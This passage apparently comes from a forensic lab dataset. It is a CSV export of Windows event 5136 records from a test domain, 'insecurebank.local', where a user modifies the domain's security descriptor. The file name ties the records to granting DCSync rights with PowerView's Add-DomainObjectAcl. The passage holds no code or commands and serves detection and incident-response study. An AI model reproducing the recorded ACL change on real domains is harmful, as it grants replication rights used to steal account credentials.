A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
16,198242593,2019-03-25 21:28:45.0236298,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""57dccd4c-7381-4371-8480-d74d47019ad8""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
17,198242594,2019-03-25 21:28:45.0246347,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3300,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""af3067e0-bb6f-47c2-aa20-f3f458797f38""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
18,198242595,2019-03-25 21:28:45.0246347,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,1,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""af3067e0-bb6f-47c2-aa20-f3f458797f38""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
19,198242596,2019-03-25 21:28:45.0246347,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,896,DC1.insecurebank.local,1,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""30f197fc-beca-48d6-923e-a52a437119d3""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
20,198242597,2019-03-25 21:28:45.0256272,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,1,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit 